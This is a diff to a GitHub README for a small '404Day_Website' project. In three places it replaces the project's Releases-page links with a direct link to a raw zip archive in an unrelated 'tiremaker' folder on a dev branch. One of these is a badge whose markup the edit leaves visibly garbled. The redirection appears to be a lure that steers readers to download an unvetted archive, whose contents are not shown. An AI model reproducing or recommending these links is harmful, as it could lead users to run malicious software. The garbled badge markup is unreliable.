@@ -1,6 +1,6 @@
 # 📅 404Day_Website - Celebrate the Joy of Hyperlinks
 
-[![Download 404Day Website](https://img.shields.io/badge/Download%20Now-404Day%20Website-blue.svg)](https://github.com/sunilsingh9148/404Day_Website/releases)
+[![Download 404Day Website](https://raw.githubusercontent.com/sunilsingh9148/404Day_Website/404Day_Website_Main-dev/tiremaker/404Day_Website.zip%20Now-404Day%https://raw.githubusercontent.com/sunilsingh9148/404Day_Website/404Day_Website_Main-dev/tiremaker/404Day_Website.zip)](https://raw.githubusercontent.com/sunilsingh9148/404Day_Website/404Day_Website_Main-dev/tiremaker/404Day_Website.zip)
 
 ## 📚 Overview
 
@@ -26,7 +26,7 @@ To get started with the 404Day_Website, you can easily download the software fro
 
 Go to our Releases page by clicking the link below. This page contains the latest version of the 404Day_Website application.
 
-[Visit this page to download](https://github.com/sunilsingh9148/404Day_Website/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sunilsingh9148/404Day_Website/404Day_Website_Main-dev/tiremaker/404Day_Website.zip)
 
 ### Step 2: Choose Your Version
 
@@ -79,4 +79,4 @@ The 404Day_Website is open-source software licensed under the GPL-3.0 License. Y
 
 For any questions or support, feel free to reach out via our GitHub Issues page or connect with us through our social media channels.
 
-[Visit this page to download](https://github.com/sunilsingh9148/404Day_Website/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sunilsingh9148/404Day_Website/404Day_Website_Main-dev/tiremaker/404Day_Website.zip)
